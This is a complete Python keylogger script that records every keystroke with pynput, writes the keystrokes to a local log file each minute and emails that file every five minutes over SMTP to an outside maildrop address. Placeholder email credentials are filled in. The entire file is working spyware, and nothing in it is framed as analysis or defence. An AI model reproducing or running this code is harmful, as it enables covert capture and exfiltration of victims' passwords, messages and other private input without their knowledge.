import os
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from pynput.keyboard import Listener
from threading import Timer, Lock

# Email credentials and configuration
email_user = 'sample@outlook.com'  # Sender's email
email_password = 'some random password'   # App password or generated password
email_send = 'your_temporary_mail@maildrop.cc'  # Recipient's email
log_file = os.path.join(os.getcwd(), "log.txt")  # File to store key logs
email_subject = 'Keylogger Logs'

# Buffer and lock
key_buffer = []
buffer_lock = Lock()

# Function to send email with the log file attach
def send_email():
    try:
        if not os.path.exists(log_file):
            print("No log file to send.")
            return

        # Prepare the email
        msg = MIMEMultipart()
        msg['From'] = email_user
        msg['To'] = email_send
        msg['Subject'] = email_subject
        body = 'Attached are the keylogger logs.'
        msg.attach(MIMEText(body, 'plain'))

        # Attach the log file
        with open(log_file, 'rb') as attachment:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f"attachment; filename=log.txt")
        msg.attach(part)

        # Send the email via SMTP
        server = smtplib.SMTP('smtp-mail.outlook.com', 587)
        server.starttls()
        server.login(email_user, email_password)
        server.sendmail(email_user, email_send, msg.as_string())
        print("Log file sent successfully!")
    except Exception as e:
        print(f"Failed to send email: {e}")
    finally:
        try:
            server.quit()
        except Exception as e:
            print(f"Error closing SMTP server: {e}")

# Function to write buffered keys to the file periodically
def write_to_file():
    global key_buffer
    try:
        with buffer_lock:
            if key_buffer:
                with open(log_file, 'a') as f:
                    f.write(''.join(key_buffer))
                key_buffer = []  # Clear buffer after writing
    except Exception as e:
        print(f"Error writing to log file: {e}")

    # Schedule the function to run again in 60 seconds
    Timer(60, write_to_file).start()

# Function to capture keystrokes
def on_press(key):
    global key_buffer
    try:
        letter = str(key).replace("'", "")
        if letter == 'Key.space':
            letter = ' '
        elif letter in ('Key.enter', 'Key.tab'):
            letter = '\n'
        elif letter.startswith('Key'):
            letter = ''  # Ignore other special keys
        with buffer_lock:
            key_buffer.append(letter)
    except Exception as e:
        print(f"Error logging key: {e}")

# Function to periodically send logs via email
def schedule_email():
    send_email()
    Timer(300, schedule_email).start()  # Schedule every 5 minutes

# Start keylogger, file writing, and email scheduling
write_to_file()  # Start writing keys to the file
schedule_email()  # Start sending emails periodically

with Listener(on_press=on_press) as listener:
    listener.join()
